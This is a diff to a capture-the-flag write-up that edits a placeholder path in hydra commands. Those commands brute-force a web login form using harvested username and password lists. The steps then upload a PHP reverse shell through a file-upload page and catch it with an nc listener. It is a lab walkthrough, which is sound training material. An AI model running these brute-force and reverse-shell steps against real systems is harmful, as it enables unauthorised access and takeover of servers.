@@ -16,9 +16,9 @@
 
 * Also from FTP we got a directory. Opening that gave us a login page. So we have a list of usernames, password and a login page. Simple idea is to use hydra for password cracking. 
 
-* Type the command ' *hydra -L userid -P credentials.txt IP http-post-form "/<directoryWhihcWeGotFromFTP>/authenticate.php:username=^USER^&password=^PASS^:Incorrect username!* '.  This will give username. 
+* Type the command ' *hydra -L userid -P credentials.txt IP http-post-form "/directoryWhihcWeGotFromFTP/authenticate.php:username=^USER^&password=^PASS^:Incorrect username!* '.  This will give username. 
 
-* Now to crack password we will use command ' *hydra -l <userFromAboveResult> -P credentials.txt IP http-post-form "/<directoryWhihcWeGotFromFTP>/authenticate.php:username=^USER^&password=^PASS^:Incorrect password!* '. This will give us our password.
+* Now to crack password we will use command ' *hydra -l <userFromAboveResult> -P credentials.txt IP http-post-form "/directoryWhihcWeGotFromFTP/authenticate.php:username=^USER^&password=^PASS^:Incorrect password!* '. This will give us our password.
 
 * Now login into the site using these creds. After that it gives us a uploading file option. We can upload our php reverse shell there. After uploading that start you nc listener. After that go to /<directoryWhihcWeGotFromFTP>/images/uploads/phpRevShell.php and you will get your shell.
 
